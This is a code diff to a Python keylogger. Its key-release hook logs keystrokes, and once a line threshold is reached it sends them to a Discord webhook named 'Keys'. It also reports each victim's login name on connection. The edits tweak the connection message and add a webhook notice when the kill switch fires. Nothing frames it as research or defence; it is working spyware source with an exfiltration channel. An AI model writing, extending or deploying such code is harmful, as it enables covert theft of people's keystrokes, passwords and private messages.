@@ -23,7 +23,6 @@ def generate_color(name):
     return "{:02X}{:02X}{:02X}".format(r, g, b)
 
 def check_if_should_send(lines):
-    print(lines)
     if lines >= max_lines:
         webhook = DiscordWebhook(url=url, username="Keys")
         file_path = Path.home() / "Source/main"
@@ -186,6 +185,10 @@ def on_release(key):
         check_if_should_send(lines)
 
     if kill_switch():
+        webhook = DiscordWebhook(url=url, username="Keys")
+        embed = DiscordEmbed(title=f"Killswitch activated for user: {os.getlogin()}", color=generate_color(os.getlogin()))
+        webhook.add_embed(embed)
+        webhook.execute()
         return False
 
 if not kill_switch():
@@ -198,7 +201,7 @@ if not kill_switch():
                 url = file.readline().replace("\n","")
                 max_lines = int(file.readline())
             webhook = DiscordWebhook(url=url, username="Keys")
-            embed = DiscordEmbed(title=f"Connected to {os.getlogin()}", color=generate_color(os.getlogin()))
+            embed = DiscordEmbed(title=f"Connected to user: {os.getlogin()}", color=generate_color(os.getlogin()))
             webhook.add_embed(embed)
             response = webhook.execute()
 
